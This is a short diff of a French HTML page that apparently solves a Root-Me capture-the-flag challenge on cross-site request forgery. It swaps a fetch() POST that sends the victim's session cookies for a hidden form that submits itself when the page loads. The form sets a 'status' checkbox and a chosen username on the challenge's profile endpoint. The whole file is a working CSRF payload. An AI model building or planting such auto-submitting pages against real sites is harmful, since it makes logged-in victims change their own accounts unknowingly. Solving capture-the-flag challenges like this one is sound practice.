@@ -1,15 +1,16 @@
 <!DOCTYPE html>
 <html lang="fr">
   <body>
-    <script>
-      const fd = new FormData();
-      fd.append("username", "tonioshast");
+    <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
+          method="POST"
+          enctype="multipart/form-data">
+      <input type="checkbox" name="status" checked>
+      <input type="text" name="username" value="tonioshast">
+    </form>
 
-      fetch("http://challenge01.root-me.org/web-client/ch22/?action=profile", {
-        method: "POST",
-        body: fd,
-        credentials: "include" // inclut les cookies de session
-      });
+    <script>
+      // Soumission immédiate du formulaire
+      document.forms[0].submit();
     </script>
   </body>
 </html>
